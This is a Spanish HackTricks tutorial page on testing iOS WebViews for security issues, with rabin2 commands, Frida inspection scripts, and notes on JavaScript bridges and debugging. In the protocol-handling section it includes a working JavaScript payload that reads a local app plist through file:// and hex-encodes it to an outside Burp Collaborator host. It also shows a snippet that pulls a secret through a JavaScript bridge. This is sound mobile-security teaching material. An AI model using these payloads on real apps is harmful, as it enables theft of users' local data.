# WebViews de iOS

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

El c贸digo de esta p谩gina fue extra铆do de [aqu铆](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). Consulta la p谩gina para m谩s detalles.


## Tipos de WebViews

Los WebViews se utilizan en aplicaciones para mostrar contenido web de forma interactiva. Diferentes tipos de WebViews ofrecen diferentes funcionalidades y caracter铆sticas de seguridad para aplicaciones de iOS. Aqu铆 tienes un breve resumen:

- **UIWebView**, que ya no se recomienda a partir de iOS 12 debido a su falta de soporte para deshabilitar **JavaScript**, lo que lo hace susceptible a inyecciones de scripts y ataques de **Cross-Site Scripting (XSS)**.

- **WKWebView** es la opci贸n preferida para incorporar contenido web en aplicaciones, ofreciendo un mayor control sobre el contenido y caracter铆sticas de seguridad. **JavaScript** est谩 habilitado de forma predeterminada, pero se puede deshabilitar si es necesario. Tambi茅n admite funciones para evitar que JavaScript abra ventanas autom谩ticamente y garantiza que todo el contenido se cargue de forma segura. Adem谩s, la arquitectura de **WKWebView** minimiza el riesgo de corrupci贸n de memoria que afecta al proceso principal de la aplicaci贸n.

- **SFSafariViewController** ofrece una experiencia de navegaci贸n web estandarizada dentro de las aplicaciones, reconocible por su dise帽o espec铆fico que incluye un campo de direcci贸n de solo lectura, botones de compartir y navegaci贸n, y un enlace directo para abrir contenido en Safari. A diferencia de **WKWebView**, no se puede deshabilitar **JavaScript** en **SFSafariViewController**, que tambi茅n comparte cookies y datos con Safari, manteniendo la privacidad del usuario desde la aplicaci贸n. Debe mostrarse de manera prominente seg煤n las directrices de la App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## Resumen de Exploraci贸n de Configuraci贸n de WebViews

### **Descripci贸n del An谩lisis Est谩tico**

En el proceso de examinar las configuraciones de **WebViews**, se enfoca en dos tipos principales: **UIWebView** y **WKWebView**. Para identificar estas WebViews dentro de un binario, se utilizan comandos que buscan referencias de clases espec铆ficas y m茅todos de inicializaci贸n.

- **Identificaci贸n de UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
Este comando ayuda a localizar instancias de **UIWebView** buscando cadenas de texto relacionadas con ella en el binario.

- **Identificaci贸n de WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
De manera similar, para **WKWebView**, este comando busca en el binario las cadenas de texto indicativas de su uso.

Adem谩s, para encontrar c贸mo se inicializa un **WKWebView**, se ejecuta el siguiente comando, apuntando a la firma del m茅todo relacionado con su inicializaci贸n:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **Verificaci贸n de la Configuraci贸n de JavaScript**

Para **WKWebView**, se destaca que deshabilitar JavaScript es una buena pr谩ctica a menos que sea necesario. Se busca en el binario compilado para confirmar que la propiedad `javaScriptEnabled` est谩 configurada en `false`, asegurando que JavaScript est茅 deshabilitado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **Verificaci贸n de Contenido Seguro nicamente**

**WKWebView** ofrece la capacidad de identificar problemas de contenido mixto, a diferencia de **UIWebView**. Esto se verifica utilizando la propiedad `hasOnlySecureContent` para asegurar que todos los recursos de la p谩gina se carguen a trav茅s de conexiones seguras. La b煤squeda en el binario compilado se realiza de la siguiente manera:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **Informaci贸n del An谩lisis Din谩mico**

El an谩lisis din谩mico implica inspeccionar el mont贸n de instancias de WebView y sus propiedades. Se utiliza un script llamado `webviews_inspector.js` con el objetivo de identificar instancias de `UIWebView`, `WKWebView` y `SFSafariViewController`. Este script registra informaci贸n sobre las instancias encontradas, incluyendo URLs y configuraciones relacionadas con JavaScript y contenido seguro.

La inspecci贸n del mont贸n se puede realizar utilizando `ObjC.choose()` para identificar instancias de WebView y verificar las propiedades `javaScriptEnabled` y `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

El script se ejecuta con:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**Resultados Clave**:
- Se localizan e inspeccionan correctamente las instancias de WebViews.
- Se verifica la habilitaci贸n de JavaScript y la configuraci贸n de contenido seguro.

Este resumen encapsula los pasos cr铆ticos y comandos involucrados en el an谩lisis de las configuraciones de WebView a trav茅s de enfoques est谩ticos y din谩micos, centr谩ndose en caracter铆sticas de seguridad como la habilitaci贸n de JavaScript y la detecci贸n de contenido mixto.

## Manejo de Protocolos de WebView

El manejo de contenido en WebViews es un aspecto cr铆tico, especialmente al tratar con varios protocolos como `http(s)://`, `file://` y `tel://`. Estos protocolos permiten la carga de contenido remoto y local dentro de las aplicaciones. Se enfatiza que al cargar contenido local, se deben tomar precauciones para evitar que los usuarios influyan en el nombre o la ruta del archivo y para evitar la edici贸n del contenido en s铆.

Las **WebViews** ofrecen diferentes m茅todos para la carga de contenido. Para **UIWebView**, ahora obsoleto, se utilizan m茅todos como `loadHTMLString:baseURL:` y `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, por otro lado, emplea `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` y `loadRequest:` para contenido web. M茅todos como `pathForResource:ofType:`, `URLForResource:withExtension:` e `init(contentsOf:encoding:)` se utilizan t铆picamente para cargar archivos locales. El m茅todo `loadFileURL:allowingReadAccessToURL:` es particularmente notable por su capacidad para cargar una URL o directorio espec铆fico en la WebView, potencialmente exponiendo datos sensibles si se especifica un directorio.

Para encontrar estos m茅todos en el c贸digo fuente o en el binario compilado, se pueden utilizar comandos como los siguientes:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
En cuanto al **acceso a archivos**, UIWebView lo permite de forma universal, mientras que WKWebView introduce la configuraci贸n `allowFileAccessFromFileURLs` y `allowUniversalAccessFromFileURLs` para gestionar el acceso desde URLs de archivo, siendo ambas falsas de forma predeterminada.

Se proporciona un ejemplo de script de Frida para inspeccionar las configuraciones de seguridad de **WKWebView**:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
Por 煤ltimo, un ejemplo de una carga 煤til de JavaScript destinada a exfiltrar archivos locales demuestra el riesgo de seguridad potencial asociado con WebViews mal configurados. Esta carga 煤til codifica el contenido del archivo en formato hexadecimal antes de transmitirlo a un servidor, resaltando la importancia de medidas de seguridad estrictas en las implementaciones de WebView.
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M茅todos Nativos Expuestos a Trav茅s de WebViews

## Comprendiendo las Interfaces Nativas de WebView en iOS

Desde iOS 7 en adelante, Apple proporcion贸 APIs para la **comunicaci贸n entre JavaScript en un WebView y objetos nativos** Swift u Objective-C. Esta integraci贸n se facilita principalmente a trav茅s de dos m茅todos:

- **JSContext**: Una funci贸n de JavaScript se crea autom谩ticamente cuando un bloque Swift u Objective-C se vincula a un identificador dentro de un `JSContext`. Esto permite una integraci贸n y comunicaci贸n fluida entre JavaScript y c贸digo nativo.
- **JSExport Protocol**: Al heredar el protocolo `JSExport`, se pueden exponer propiedades nativas, m茅todos de instancia y m茅todos de clase a JavaScript. Esto significa que cualquier cambio realizado en el entorno de JavaScript se refleja en el entorno nativo, y viceversa. Sin embargo, es esencial asegurarse de que datos sensibles no se expongan inadvertidamente a trav茅s de este m茅todo.

### Accediendo a `JSContext` en Objective-C

En Objective-C, el `JSContext` para un `UIWebView` se puede recuperar con la siguiente l铆nea de c贸digo:
```objc
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
### Comunicaci贸n con `WKWebView`

Para `WKWebView`, no se dispone de acceso directo a `JSContext`. En su lugar, se utiliza el paso de mensajes a trav茅s de la funci贸n `postMessage`, lo que permite la comunicaci贸n entre JavaScript y la aplicaci贸n nativa. Los controladores para estos mensajes se configuran de la siguiente manera, lo que permite que JavaScript interact煤e con la aplicaci贸n nativa de forma segura:
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### Interacci贸n y Pruebas

JavaScript puede interactuar con la capa nativa al definir un controlador de mensajes de script. Esto permite operaciones como invocar funciones nativas desde una p谩gina web:
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}

// Alternative method for calling exposed JavaScript functions
document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Para capturar y manipular el resultado de una llamada a una funci贸n nativa, se puede anular la funci贸n de devoluci贸n de llamada dentro del HTML:
```html
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
El lado nativo maneja la llamada de JavaScript como se muestra en la clase `JavaScriptBridgeMessageHandler`, donde se procesa el resultado de operaciones como la multiplicaci贸n de n煤meros y se env铆a de vuelta a JavaScript para su visualizaci贸n o manipulaci贸n adicional:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {
// Handling "multiplyNumbers" operation
case "multiplyNumbers":
let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
// Callback to JavaScript
let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
}
```
## Depuraci贸n de WebViews en iOS

(Tutorial basado en [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

Para depurar eficazmente el contenido web dentro de las WebViews de iOS, se requiere una configuraci贸n espec铆fica que involucra las herramientas de desarrollo de Safari, debido a que los mensajes enviados a `console.log()` no se muestran en los registros de Xcode. Aqu铆 tienes una gu铆a simplificada, enfatizando los pasos clave y requisitos:

- **Preparaci贸n en el Dispositivo iOS**: El Inspector Web de Safari debe estar activado en tu dispositivo iOS. Esto se hace yendo a **Configuraci贸n > Safari > Avanzado**, y activando el _Inspector Web_.

- **Preparaci贸n en el Dispositivo macOS**: En tu m谩quina de desarrollo macOS, debes habilitar las herramientas de desarrollo dentro de Safari. Abre Safari, accede a **Safari > Preferencias > Avanzado**, y selecciona la opci贸n _Mostrar men煤 Desarrollar_.

- **Conexi贸n y Depuraci贸n**: Despu茅s de conectar tu dispositivo iOS a tu computadora macOS y lanzar tu aplicaci贸n, utiliza Safari en tu dispositivo macOS para seleccionar la WebView que deseas depurar. Navega a _Desarrollar_ en la barra de men煤 de Safari, pasa el cursor sobre el nombre de tu dispositivo iOS para ver una lista de instancias de WebView, y selecciona la instancia que deseas inspeccionar. Se abrir谩 una nueva ventana del Inspector Web de Safari con este prop贸sito.

Sin embargo, ten en cuenta las limitaciones:

- La depuraci贸n con este m茅todo requiere un dispositivo macOS ya que depende de Safari.
- Solo las WebViews en aplicaciones cargadas en tu dispositivo a trav茅s de Xcode son elegibles para depuraci贸n. Las WebViews en aplicaciones instaladas a trav茅s de la App Store o Apple Configurator no pueden ser depuradas de esta manera.


## Referencias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
